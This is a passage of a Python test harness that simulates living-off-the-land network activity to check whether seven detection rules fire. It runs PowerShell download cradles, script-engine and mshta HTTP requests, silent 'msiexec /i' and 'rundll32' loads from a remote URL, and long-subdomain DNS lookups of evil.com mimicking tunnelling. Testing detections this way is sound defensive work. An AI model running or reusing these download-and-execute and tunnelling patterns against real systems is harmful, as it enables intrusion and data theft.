import subprocess, datetime, time, sqlite3, csv, os, sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPORTS_DIR = os.path.join(_REPO_ROOT, "exports")
DB_PATH = r"C:\ShadowSensor\data\shadowsensor.db"
os.makedirs(EXPORTS_DIR, exist_ok=True)

POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WSCRIPT    = r"C:\Windows\System32\wscript.exe"
CSCRIPT    = r"C:\Windows\System32\cscript.exe"
MSHTA      = r"C:\Windows\System32\mshta.exe"
RUNDLL32   = r"C:\Windows\System32\rundll32.exe"
MSIEXEC    = r"C:\Windows\System32\msiexec.exe"
NSLOOKUP   = r"C:\Windows\System32\nslookup.exe"

TEMP = r"C:\Windows\Temp"

print("=" * 60)
print("ShadowSensor Phase 7A — Subphase 3: Network Rule Simulation")
print("=" * 60)
print("PREREQUISITE: Confirm pipeline is running before this script.")
print(f"Script UTC start: {datetime.datetime.utcnow().isoformat()}")
print(f"Network targets: 8.8.8.8:80 (HTTP), 8.8.4.4:443 (HTTPS)")
print(f"Protocol: WinHTTP (EID-3 visible) — NOT WinINet (D-b blind)")


def hits_since(rule_id: str, since: datetime.datetime, quick: bool = False) -> int:
    since_str = since.strftime("%Y-%m-%d %H:%M:%S")

    def _query() -> int:
        conn = sqlite3.connect(DB_PATH)
        n = conn.execute(
            "SELECT COUNT(*) FROM rule_hits WHERE rule_id=? AND timestamp>=?",
            (rule_id, since_str)
        ).fetchone()[0]
        conn.close()
        return n

    if quick:
        return _query()

    # Poll up to 180 seconds for first hit
    deadline = time.time() + 180
    elapsed = 0
    while time.time() < deadline:
        n = _query()
        if n > 0:
            print(f"  [DB] First hit after ~{elapsed}s — waiting 30s for second launch", flush=True)
            time.sleep(30)
            n = _query()
            print(f"  [DB] Final count: {n} hit(s)", flush=True)
            return n
        time.sleep(5)
        elapsed += 5

    return _query()


def launch_argv(argv: list, label: str) -> None:
    print(f"  [LAUNCH] {label}")
    print(f"  [CMD]    {' '.join(str(a) for a in argv)}")
    try:
        subprocess.run(argv, capture_output=True, timeout=20)
    except subprocess.TimeoutExpired:
        print(f"  [WARN] Process timed out — EID-3 captured at connection attempt")
    except (PermissionError, OSError) as e:
        print(f"  [WARN] Process blocked (WinError {getattr(e, 'winerror', '?')}) — may be PARTIAL")
    time.sleep(2)


def warn_zero(rule_id: str, path: str, reason: str = "") -> None:
    """Log warning on 0 hits — do NOT call sys.exit. Continue to next path."""
    msg = f"  [WARN] 0 hits for {rule_id} {path} after full poll window"
    if reason:
        msg += f" — {reason}"
    print(msg + " — continuing.")


results = []  # written to CSV at end
SIM_START = datetime.datetime.utcnow()
print(f"\nSimulation window start (UTC): {SIM_START.isoformat()}\n")

# ---------------------------------------------------------------------------
# BLOCK 2 — Pre-flight: write script files to disk
# ---------------------------------------------------------------------------
_script_files = {
    os.path.join(TEMP, "ss_winhttp80.vbs"): (
        "On Error Resume Next\n"
        "Dim h : Set h = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\n"
        "h.Open \"GET\", \"http://8.8.8.8/\", False\n"
        "h.SetTimeouts 3000, 3000, 3000, 3000\n"
        "h.Send\n"
        "WScript.Quit 0\n"
    ),
    os.path.join(TEMP, "ss_winhttp443.vbs"): (
        "On Error Resume Next\n"
        "Dim h : Set h = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\n"
        "h.Open \"GET\", \"https://8.8.4.4/\", False\n"
        "h.SetTimeouts 3000, 3000, 3000, 3000\n"
        "h.Send\n"
        "WScript.Quit 0\n"
    ),
    os.path.join(TEMP, "ss_mshta80.hta"): (
        "<html><head><script language=\"VBScript\">\n"
        "On Error Resume Next\n"
        "Dim h : Set h = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\n"
        "h.Open \"GET\", \"http://8.8.8.8/\", False\n"
        "h.SetTimeouts 3000, 3000, 3000, 3000\n"
        "h.Send\n"
        "window.close()\n"
        "</script></head><body></body></html>\n"
    ),
    os.path.join(TEMP, "ss_mshta443.hta"): (
        "<html><head><script language=\"VBScript\">\n"
        "On Error Resume Next\n"
        "Dim h : Set h = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\n"
        "h.Open \"GET\", \"https://8.8.4.4/\", False\n"
        "h.SetTimeouts 3000, 3000, 3000, 3000\n"
        "h.Send\n"
        "window.close()\n"
        "</script></head><body></body></html>\n"
    ),
    os.path.join(TEMP, "ss_dns_long.vbs"): (
        "On Error Resume Next\n"
        "Dim h : Set h = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\n"
        "h.Open \"GET\", \"http://shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com/\", False\n"
        "h.SetTimeouts 3000, 3000, 3000, 3000\n"
        "h.Send\n"
        "WScript.Quit 0\n"
    ),
    os.path.join(TEMP, "ss_dns_long_mshta.hta"): (
        "<html><head><script language=\"VBScript\">\n"
        "On Error Resume Next\n"
        "Dim h : Set h = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\n"
        "h.Open \"GET\", \"http://shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com/\", False\n"
        "h.SetTimeouts 3000, 3000, 3000, 3000\n"
        "h.Send\n"
        "window.close()\n"
        "</script></head><body></body></html>\n"
    ),
}

for _path, _content in _script_files.items():
    try:
        with open(_path, "w", encoding="utf-8") as _f:
            _f.write(_content)
        print(f"  [WRITE] {_path}")
    except OSError as e:
        print(f"  [ERROR] Failed to write {_path}: {e}")

LONG_DNS = "shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com"

# ---------------------------------------------------------------------------
# RULE 1: NET_POWERSHELL_HTTP_001
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_POWERSHELL_HTTP_001")
print("=" * 60)

# Path A — HTTPS to IP-direct (port 443, null hostname)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
cmd_a = "try { Invoke-WebRequest -Uri 'https://8.8.4.4/' -TimeoutSec 5 -ErrorAction SilentlyContinue } catch { }"
launch_argv([POWERSHELL, "-Command", cmd_a], "NET_POWERSHELL_HTTP_001 Path A Launch 1")
launch_argv([POWERSHELL, "-Command", cmd_a], "NET_POWERSHELL_HTTP_001 Path A Launch 2")
n = hits_since("NET_POWERSHELL_HTTP_001", path_start)
if n == 0:
    warn_zero("NET_POWERSHELL_HTTP_001", "Path A")
    result = "FAIL"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_POWERSHELL_HTTP_001",
    "attack_path": "Path A",
    "field_values_used": "powershell.exe;initiated=true;destination_port=443;destination_hostname=null;Invoke-WebRequest https://8.8.4.4/",
    "result": result,
    "reason": f"{n} hits",
    "timestamp_utc": ts,
})

# Path B — HTTP to IP-direct (port 80, null hostname)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
cmd_b = "try { Invoke-WebRequest -Uri 'http://8.8.8.8/' -TimeoutSec 5 -ErrorAction SilentlyContinue } catch { }"
launch_argv([POWERSHELL, "-Command", cmd_b], "NET_POWERSHELL_HTTP_001 Path B Launch 1")
launch_argv([POWERSHELL, "-Command", cmd_b], "NET_POWERSHELL_HTTP_001 Path B Launch 2")
n = hits_since("NET_POWERSHELL_HTTP_001", path_start)
if n == 0:
    warn_zero("NET_POWERSHELL_HTTP_001", "Path B")
    result = "FAIL"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_POWERSHELL_HTTP_001",
    "attack_path": "Path B",
    "field_values_used": "powershell.exe;initiated=true;destination_port=80;destination_hostname=null;Invoke-WebRequest http://8.8.8.8/",
    "result": result,
    "reason": f"{n} hits",
    "timestamp_utc": ts,
})

# Path C — HTTPS IP-direct via WebClient (port 443)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
cmd_c = "try { (New-Object System.Net.WebClient).DownloadString('https://8.8.4.4/') } catch { }"
launch_argv([POWERSHELL, "-Command", cmd_c], "NET_POWERSHELL_HTTP_001 Path C Launch 1")
launch_argv([POWERSHELL, "-Command", cmd_c], "NET_POWERSHELL_HTTP_001 Path C Launch 2")
n = hits_since("NET_POWERSHELL_HTTP_001", path_start)
if n == 0:
    warn_zero("NET_POWERSHELL_HTTP_001", "Path C")
    result = "FAIL"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_POWERSHELL_HTTP_001",
    "attack_path": "Path C",
    "field_values_used": "powershell.exe;initiated=true;destination_port=443;destination_hostname=null;WebClient.DownloadString https://8.8.4.4/",
    "result": result,
    "reason": f"{n} hits",
    "timestamp_utc": ts,
})

# FP suppression test
fp_start = datetime.datetime.utcnow()
fp_ts = fp_start.isoformat()
launch_argv([POWERSHELL, "-Command",
    "try { Invoke-WebRequest -Uri 'http://www.microsoft.com/' -TimeoutSec 5 -ErrorAction SilentlyContinue } catch { }"],
    "FP Test: PS → www.microsoft.com (excluded domain)")
time.sleep(5)
n_fp = hits_since("NET_POWERSHELL_HTTP_001", fp_start, quick=True)
if n_fp > 0:
    print(f"  [WARN] FP suppression FAILED — {n_fp} hit(s) for microsoft.com connection")
    fp_result = "FAIL"
    fp_reason = f"{n_fp} hits for excluded hostname www.microsoft.com"
else:
    print(f"  [PASS] FP suppression OK — 0 hits for excluded hostname www.microsoft.com")
    fp_result = "PASS"
    fp_reason = "0 hits for excluded hostname www.microsoft.com"
results.append({
    "rule_id": "NET_POWERSHELL_HTTP_001",
    "attack_path": "FP_SUPPRESSION",
    "field_values_used": "powershell.exe;Invoke-WebRequest http://www.microsoft.com/ (excluded .microsoft.com)",
    "result": fp_result,
    "reason": fp_reason,
    "timestamp_utc": fp_ts,
})

# ---------------------------------------------------------------------------
# RULE 2: NET_DNS_LONG_QUERY_001
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_DNS_LONG_QUERY_001")
print("=" * 60)

# Path A — powershell.exe via [System.Net.Dns]
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
cmd_a = f"try {{ [System.Net.Dns]::GetHostEntry('{LONG_DNS}') }} catch {{ }}"
launch_argv([POWERSHELL, "-Command", cmd_a], "NET_DNS_LONG_QUERY_001 Path A Launch 1")
launch_argv([POWERSHELL, "-Command", cmd_a], "NET_DNS_LONG_QUERY_001 Path A Launch 2")
n = hits_since("NET_DNS_LONG_QUERY_001", path_start)
if n == 0:
    warn_zero("NET_DNS_LONG_QUERY_001", "Path A")
    result = "FAIL"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_DNS_LONG_QUERY_001",
    "attack_path": "Path A",
    "field_values_used": f"powershell.exe;[System.Net.Dns]::GetHostEntry;query_name={LONG_DNS} (68 chars)",
    "result": result,
    "reason": f"{n} hits",
    "timestamp_utc": ts,
})

# Path B — powershell.exe via Resolve-DnsName
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
cmd_b = f"Resolve-DnsName '{LONG_DNS}' -ErrorAction SilentlyContinue"
launch_argv([POWERSHELL, "-Command", cmd_b], "NET_DNS_LONG_QUERY_001 Path B Launch 1")
launch_argv([POWERSHELL, "-Command", cmd_b], "NET_DNS_LONG_QUERY_001 Path B Launch 2")
n = hits_since("NET_DNS_LONG_QUERY_001", path_start)
if n == 0:
    warn_zero("NET_DNS_LONG_QUERY_001", "Path B")
    result = "FAIL"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_DNS_LONG_QUERY_001",
    "attack_path": "Path B",
    "field_values_used": f"powershell.exe;Resolve-DnsName;query_name={LONG_DNS} (68 chars)",
    "result": result,
    "reason": f"{n} hits",
    "timestamp_utc": ts,
})

# Path C — nslookup.exe (substitution for custom binary from rule_insights)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([NSLOOKUP, LONG_DNS], "NET_DNS_LONG_QUERY_001 Path C Launch 1")
launch_argv([NSLOOKUP, LONG_DNS], "NET_DNS_LONG_QUERY_001 Path C Launch 2")
n = hits_since("NET_DNS_LONG_QUERY_001", path_start)
if n == 0:
    warn_zero("NET_DNS_LONG_QUERY_001", "Path C")
    result = "FAIL"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_DNS_LONG_QUERY_001",
    "attack_path": "Path C",
    "field_values_used": f"nslookup.exe;query_name={LONG_DNS} (68 chars)",
    "result": result,
    "reason": f"{n} hits; substituted nslookup.exe for custom binary (rule_insights Path C)",
    "timestamp_utc": ts,
})

# ---------------------------------------------------------------------------
# RULE 3: NET_DNS_SCRIPT_ENGINE_001 (D29 risk)
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_DNS_SCRIPT_ENGINE_001 (D29 risk)")
print("=" * 60)

# Path A — wscript.exe DNS
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_dns_long.vbs"],
            "NET_DNS_SCRIPT_ENGINE_001 Path A Launch 1")
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_dns_long.vbs"],
            "NET_DNS_SCRIPT_ENGINE_001 Path A Launch 2")
n = hits_since("NET_DNS_SCRIPT_ENGINE_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_DNS_SCRIPT_ENGINE_001 Path A. "
          f"Script engine telemetry gap — not a rule defect.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_DNS_SCRIPT_ENGINE_001",
    "attack_path": "Path A",
    "field_values_used": f"wscript.exe;ss_dns_long.vbs;query_name={LONG_DNS}",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path B — cscript.exe DNS
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_dns_long.vbs"],
            "NET_DNS_SCRIPT_ENGINE_001 Path B Launch 1")
launch_argv([CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_dns_long.vbs"],
            "NET_DNS_SCRIPT_ENGINE_001 Path B Launch 2")
n = hits_since("NET_DNS_SCRIPT_ENGINE_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_DNS_SCRIPT_ENGINE_001 Path B. "
          f"Script engine telemetry gap — not a rule defect.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_DNS_SCRIPT_ENGINE_001",
    "attack_path": "Path B",
    "field_values_used": f"cscript.exe;ss_dns_long.vbs;query_name={LONG_DNS}",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path C — mshta.exe DNS
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([MSHTA, r"C:\Windows\Temp\ss_dns_long_mshta.hta"],
            "NET_DNS_SCRIPT_ENGINE_001 Path C Launch 1")
launch_argv([MSHTA, r"C:\Windows\Temp\ss_dns_long_mshta.hta"],
            "NET_DNS_SCRIPT_ENGINE_001 Path C Launch 2")
n = hits_since("NET_DNS_SCRIPT_ENGINE_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_DNS_SCRIPT_ENGINE_001 Path C. "
          f"Script engine telemetry gap — not a rule defect.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_DNS_SCRIPT_ENGINE_001",
    "attack_path": "Path C",
    "field_values_used": f"mshta.exe;ss_dns_long_mshta.hta;query_name={LONG_DNS}",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# ---------------------------------------------------------------------------
# RULE 4: NET_SCRIPTING_ENGINE_HTTP_001 (D29 risk)
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_SCRIPTING_ENGINE_HTTP_001 (D29 risk)")
print("=" * 60)

# Path A — wscript.exe HTTPS to 8.8.4.4:443
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp443.vbs"],
            "NET_SCRIPTING_ENGINE_HTTP_001 Path A Launch 1")
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp443.vbs"],
            "NET_SCRIPTING_ENGINE_HTTP_001 Path A Launch 2")
n = hits_since("NET_SCRIPTING_ENGINE_HTTP_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_SCRIPTING_ENGINE_HTTP_001 Path A.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_SCRIPTING_ENGINE_HTTP_001",
    "attack_path": "Path A",
    "field_values_used": "wscript.exe;initiated=true;destination_port=443;ss_winhttp443.vbs → https://8.8.4.4/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path B — cscript.exe HTTP to 8.8.8.8:80
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPTING_ENGINE_HTTP_001 Path B Launch 1")
launch_argv([CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPTING_ENGINE_HTTP_001 Path B Launch 2")
n = hits_since("NET_SCRIPTING_ENGINE_HTTP_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_SCRIPTING_ENGINE_HTTP_001 Path B.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_SCRIPTING_ENGINE_HTTP_001",
    "attack_path": "Path B",
    "field_values_used": "cscript.exe;initiated=true;destination_port=80;ss_winhttp80.vbs → http://8.8.8.8/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path C — wscript.exe HTTP to 8.8.8.8:80
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPTING_ENGINE_HTTP_001 Path C Launch 1")
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPTING_ENGINE_HTTP_001 Path C Launch 2")
n = hits_since("NET_SCRIPTING_ENGINE_HTTP_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_SCRIPTING_ENGINE_HTTP_001 Path C.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_SCRIPTING_ENGINE_HTTP_001",
    "attack_path": "Path C",
    "field_values_used": "wscript.exe;initiated=true;destination_port=80;ss_winhttp80.vbs → http://8.8.8.8/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# ---------------------------------------------------------------------------
# RULE 5: NET_SCRIPT_ENGINE_OUTBOUND_001 (partial D29 risk)
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_SCRIPT_ENGINE_OUTBOUND_001 (partial D29 risk)")
print("=" * 60)

# Path A — wscript.exe HTTP to 8.8.8.8:80 (D29 risk)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPT_ENGINE_OUTBOUND_001 Path A Launch 1")
launch_argv([WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPT_ENGINE_OUTBOUND_001 Path A Launch 2")
n = hits_since("NET_SCRIPT_ENGINE_OUTBOUND_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_SCRIPT_ENGINE_OUTBOUND_001 Path A.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_SCRIPT_ENGINE_OUTBOUND_001",
    "attack_path": "Path A",
    "field_values_used": "wscript.exe;initiated=true;ss_winhttp80.vbs → http://8.8.8.8/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path B — cscript.exe HTTP to 8.8.8.8:80 (D29 risk)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPT_ENGINE_OUTBOUND_001 Path B Launch 1")
launch_argv([CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"],
            "NET_SCRIPT_ENGINE_OUTBOUND_001 Path B Launch 2")
n = hits_since("NET_SCRIPT_ENGINE_OUTBOUND_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_SCRIPT_ENGINE_OUTBOUND_001 Path B.")
    result = "INCONCLUSIVE"
    reason = "D29: script engine telemetry gap — not a rule defect"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_SCRIPT_ENGINE_OUTBOUND_001",
    "attack_path": "Path B",
    "field_values_used": "cscript.exe;initiated=true;ss_winhttp80.vbs → http://8.8.8.8/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path C — mshta.exe HTTP to 8.8.8.8:80 (NOT confirmed D29-affected)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"],
            "NET_SCRIPT_ENGINE_OUTBOUND_001 Path C Launch 1")
launch_argv([MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"],
            "NET_SCRIPT_ENGINE_OUTBOUND_001 Path C Launch 2")
n = hits_since("NET_SCRIPT_ENGINE_OUTBOUND_001", path_start)
if n == 0:
    warn_zero("NET_SCRIPT_ENGINE_OUTBOUND_001", "Path C")
    result = "FAIL"
    reason = f"{n} hits"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_SCRIPT_ENGINE_OUTBOUND_001",
    "attack_path": "Path C",
    "field_values_used": "mshta.exe;initiated=true;ss_mshta80.hta → http://8.8.8.8/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# ---------------------------------------------------------------------------
# RULE 6: NET_LOLBIN_PROCESS_HTTP_001
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_LOLBIN_PROCESS_HTTP_001")
print("=" * 60)
print("NOTE: cmd.exe substituted — cannot natively initiate TCP; using msiexec/mshta/rundll32")

# Path A — mshta.exe HTTPS to 8.8.4.4:443
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([MSHTA, r"C:\Windows\Temp\ss_mshta443.hta"],
            "NET_LOLBIN_PROCESS_HTTP_001 Path A Launch 1")
launch_argv([MSHTA, r"C:\Windows\Temp\ss_mshta443.hta"],
            "NET_LOLBIN_PROCESS_HTTP_001 Path A Launch 2")
n = hits_since("NET_LOLBIN_PROCESS_HTTP_001", path_start)
if n == 0:
    warn_zero("NET_LOLBIN_PROCESS_HTTP_001", "Path A")
    result = "FAIL"
    reason = f"{n} hits; cmd.exe substituted — mshta used (cmd cannot initiate TCP)"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits; cmd.exe substituted — mshta used (cmd cannot initiate TCP)"
else:
    result = "PARTIAL"
    reason = f"{n} hits; cmd.exe substituted — mshta used (cmd cannot initiate TCP)"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_LOLBIN_PROCESS_HTTP_001",
    "attack_path": "Path A",
    "field_values_used": "mshta.exe;initiated=true;destination_port=443;ss_mshta443.hta → https://8.8.4.4/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path B — msiexec.exe HTTP to 8.8.8.8:80 (D-b risk)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([MSIEXEC, "/i", "http://8.8.8.8/a.msi", "/qn"],
            "NET_LOLBIN_PROCESS_HTTP_001 Path B Launch 1")
launch_argv([MSIEXEC, "/i", "http://8.8.8.8/a.msi", "/qn"],
            "NET_LOLBIN_PROCESS_HTTP_001 Path B Launch 2")
n = hits_since("NET_LOLBIN_PROCESS_HTTP_001", path_start)
if n == 0:
    print("  [D-b] INCONCLUSIVE — msiexec WinINet internal path likely — not a rule defect")
    result = "INCONCLUSIVE"
    reason = "D-b: process uses WinINet internally — EID-3 not generated; cmd.exe substituted — msiexec used"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits; cmd.exe substituted — msiexec used (cmd cannot initiate TCP)"
else:
    result = "PARTIAL"
    reason = f"{n} hits; cmd.exe substituted — msiexec used (cmd cannot initiate TCP)"
print(f"  Path B: {result} ({n} hits)")
results.append({
    "rule_id": "NET_LOLBIN_PROCESS_HTTP_001",
    "attack_path": "Path B",
    "field_values_used": "msiexec.exe;/i http://8.8.8.8/a.msi /qn;initiated=true;destination_port=80",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path C — rundll32.exe HTTP to 8.8.8.8:80 (D-b risk)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([RUNDLL32, "http://8.8.8.8/a.dll,Entry"],
            "NET_LOLBIN_PROCESS_HTTP_001 Path C Launch 1")
launch_argv([RUNDLL32, "http://8.8.8.8/a.dll,Entry"],
            "NET_LOLBIN_PROCESS_HTTP_001 Path C Launch 2")
n = hits_since("NET_LOLBIN_PROCESS_HTTP_001", path_start)
if n == 0:
    print("  [D-b] INCONCLUSIVE — rundll32 DLL fetch may use WinINet")
    result = "INCONCLUSIVE"
    reason = "D-b: process uses WinINet internally — EID-3 not generated; cmd.exe substituted — rundll32 used"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits; cmd.exe substituted — rundll32 used (cmd cannot initiate TCP)"
else:
    result = "PARTIAL"
    reason = f"{n} hits; cmd.exe substituted — rundll32 used (cmd cannot initiate TCP)"
print(f"  Path C: {result} ({n} hits)")
results.append({
    "rule_id": "NET_LOLBIN_PROCESS_HTTP_001",
    "attack_path": "Path C",
    "field_values_used": "rundll32.exe;http://8.8.8.8/a.dll,Entry;initiated=true;destination_port=80",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# ---------------------------------------------------------------------------
# RULE 7: NET_LOLBIN_NETWORK_001
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RULE: NET_LOLBIN_NETWORK_001")
print("=" * 60)

# Path A — mshta.exe HTTP to 8.8.8.8:80
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"],
            "NET_LOLBIN_NETWORK_001 Path A Launch 1")
launch_argv([MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"],
            "NET_LOLBIN_NETWORK_001 Path A Launch 2")
n = hits_since("NET_LOLBIN_NETWORK_001", path_start)
if n == 0:
    warn_zero("NET_LOLBIN_NETWORK_001", "Path A")
    result = "FAIL"
    reason = f"{n} hits"
elif n >= 2:
    result = "PASS"
    reason = f"{n} hits"
else:
    result = "PARTIAL"
    reason = f"{n} hits"
print(f"  Path A: {result} ({n} hits)")
results.append({
    "rule_id": "NET_LOLBIN_NETWORK_001",
    "attack_path": "Path A",
    "field_values_used": "mshta.exe;initiated=true;ss_mshta80.hta → http://8.8.8.8/",
    "result": result,
    "reason": reason,
    "timestamp_utc": ts,
})

# Path B — msiexec.exe HTTP to 8.8.8.8:80 (D-b risk)
path_start = datetime.datetime.utcnow()
ts = path_start.isoformat()
launch_argv([MSIEXEC, "/i", "http://8.8.8.8/b.msi", "/qn"],
            "NET_LOLBIN_NETWORK_001 Path B Launch 1")
launch_argv([MSIEXEC, "/i", "http://8.8.8.8/b.msi", "/qn"],
            "NET_LOLBIN_NETWORK_001 Path B Launch 2")
